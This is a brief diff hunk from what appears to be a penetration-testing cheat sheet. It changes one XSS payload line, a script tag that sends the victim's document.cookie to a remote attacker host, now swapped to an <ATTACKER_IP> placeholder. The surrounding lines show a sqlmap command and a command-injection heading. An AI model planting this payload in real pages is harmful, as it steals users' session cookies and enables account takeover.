@@ -585,7 +585,7 @@ sqlmap -r req.txt --level=2 --dupm
 ```
 ## XSS
 ```html
-<script>var i = new Image();i.src = "http://192.168.57.4:9080?" + document.cookie;</script>
+<script>var i = new Image();i.src = "http://<ATTACKER_IP>:PORT?" + document.cookie;</script>
 ```
 ## Command injection 
 * Transfer the payload for the target
